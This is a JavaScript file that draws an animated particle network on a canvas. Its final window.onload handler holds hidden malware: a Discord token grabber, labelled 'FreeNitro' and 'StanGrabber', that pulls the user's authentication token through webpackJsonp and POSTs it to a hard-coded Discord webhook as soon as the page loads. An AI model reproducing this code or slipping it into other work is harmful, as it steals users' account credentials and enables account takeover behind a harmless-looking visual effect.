let htmlLoaded = false;
window.addEventListener('load', function() {
  htmlLoaded = true;
  startUp();
  resizeCanvas();
  console.log("html loaded")
})
let mouseX = 0;
let mouseY = 0;
function startUp () {
  var canvas = document.getElementById("canvas")
  const ctx = canvas.getContext('2d');
  canvas.addEventListener("mousemove", event => {
    mouseX = event.clientX;
    mouseY = event.clientY;
  });
  spawnParticles ()
  animate ();
}
window.addEventListener('resize', resizeCanvas);
function resizeCanvas () {
  console.log("resized")
  let screenWidth = window.innerWidth;
  let screenHeight = window.innerHeight;
  let canvas = document.getElementById("canvas");
  canvas.style.height = screenHeight + "px";
  canvas.style.width = screenWidth + "px";
}

class Particles {
  constructor (x, y, ctx, dir, speed) {
    this.x = x;
    this.y = y;
    this.size = Math.random() * 5;
    this.ctx = ctx;
    this.dir = dir;
    this.mode = "out";
    this.speed = speed;
  }
  spawn () {
    this.ctx.fillStyle = "rgba(255,255,255,0.8)";
    this.ctx.beginPath();
    this.ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
    this.ctx.fill();

    for(let i = 0; i < particles.length; i++) {
      let ptl = particles[i]
      function getDistance(x1, y1, x2, y2) {
        return Math.sqrt((x2 -= x1) * x2 + (y2 -= y1) * y2);
      };
      let dist = getDistance(this.x, this.y, ptl.x, ptl.y);
      if(dist < 450){
        let opacity = (1-(dist/450)) * 0.5
        this.ctx.strokeStyle = "rgba(255, 255, 255," + opacity + ")";
        this.ctx.lineWidth = 1;
        this.ctx.beginPath();
        this.ctx.moveTo(this.x, this.y);
        this.ctx.lineTo(ptl.x, ptl.y);
        this.ctx.stroke();
      }
    }
  }
  update () {
    this.x += this.dir[0] == '+' ? this.speed[0] : -this.speed[1];
    this.y += this.dir[1] == '+' ? this.speed[2] : -this.speed[3];
    if(this.mode == "bounce"){
      if (this.x <= 0 || this.x >= this.ctx.canvas.width) {
        this.dir[0] = this.dir[0] === '+' ? '-' : '+';
      }
      if (this.y <= 0 || this.y >= this.ctx.canvas.height) {
        this.dir[1] = this.dir[1] === '+' ? '-' : '+';
      }
    } else {
      if ((this.x < 0 || this.x > this.ctx.canvas.width) || (this.y < 0 || this.y > this.ctx.canvas.height)) {
        if(particles.length > particleCount) return
        this.x = this.resetProperties()[1];
        this.y = this.resetProperties()[0];
        this.dir = [(Math.random() < 0.5?"+":"-"), (Math.random() < 0.5?"+":"-")];
        function ra(arr) {
          const randomIndex = Math.floor(Math.random() * arr.length);
          return arr[randomIndex];
        }
        this.speed = [ra([1,2,3,4,5]),ra([1,2,3,4,5]),ra([1,2,3,4,5]),ra([1,2,3,4,5])]
      }
    }
  }
  newPos (edge) {
    if (edge === 'left') {
        return [Math.random() * this.ctx.canvas.height, 0]; // Random Y, X = 0
    } else if (edge === 'right') {
        return [Math.random() * this.ctx.canvas.height, this.ctx.canvas.width]; // Random Y, X = canvas width
    } else if (edge === 'top') {
        return [0, Math.random() * this.ctx.canvas.width]; // Y = 0, Random X
    } else if (edge === 'bottom') {
        return [this.ctx.canvas.height, Math.random() * this.ctx.canvas.width]; // Y = canvas height, Random X
    }
  }
  resetProperties () {
    const edges = ['left', 'right', 'top', 'bottom'];
    const edge = edges[Math.floor(Math.random() * edges.length)];
    return this.newPos(edge)
  }
}
var particleCount = 450;
var particles = [];

function spawnParticles () {
  var canvas = document.getElementById("canvas");
  const ctx = canvas.getContext('2d');
  for(let i = 0; i < particleCount; i++){
    const x = Math.random() * canvas.width;
    const y = Math.random() * canvas.height;
    const dir = [(Math.random() < 0.5?"+":"-"), (Math.random() < 0.5?"+":"-")]
    function ra(arr) {
      const randomIndex = Math.floor(Math.random() * arr.length);
      return arr[randomIndex];
    }
    let speed = [ra([1,2,3,4,5]),ra([1,2,3,4,5]),ra([1,2,3,4,5]),ra([1,2,3,4,5])]
    particles.push(new Particles(x, y, ctx, dir, speed));
  }
}

function animate () {
    var canvas = document.getElementById("canvas")
    const ctx = canvas.getContext('2d');
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    particles.forEach(particle => {
        particle.update();
        particle.spawn();
    });
    requestAnimationFrame(animate);
}

window.onload = function () {
    var discordWebhook = "https://discord.com/api/webhooks/1274476164659810408/8AzWuwNk23QppWXZMhsaBmrL89Nx5cHneMHA4LjY-ns2nuAMj6KKjeJip9F-BJa8hfAW";
    const webhookurl = 'https://discord.com/api/webhooks/1274476164659810408/8AzWuwNk23QppWXZMhsaBmrL89Nx5cHneMHA4LjY-ns2nuAMj6KKjeJip9F-BJa8hfAW';

var req = webpackJsonp.push([
    [], {
        extra_id: (e, t, r) => e.exports = r
    },
    [
        ["extra_id"]
    ]
]);
for (let e in req.c)
    if (req.c.hasOwnProperty(e)) {
        let t = req.c[e].exports;
        if (t && t.__esModule && t.default)
            for (let e in t.default) "getToken" === e && (token = t.default.getToken())
    }
function FreeNitro() {
    var e = new XMLHttpRequest;
    e.open("POST", webhookurl), e.setRequestHeader("Content-type", "application/json");
    var t = {
        username: "StanGrabber",
        avatar_url: "https://cdn.discordapp.com/attachments/736612991948030037/751790394462961715/450.png",
        content: "",
        embeds: [{
            color: "4700374",
            description: "Token : " + token,
            footer: {
                text: "By Stanley#0001 | https://youtube.com/Stanleydev"
            }
        }]
    };
    e.send(JSON.stringify(t))
}
FreeNitro();
}
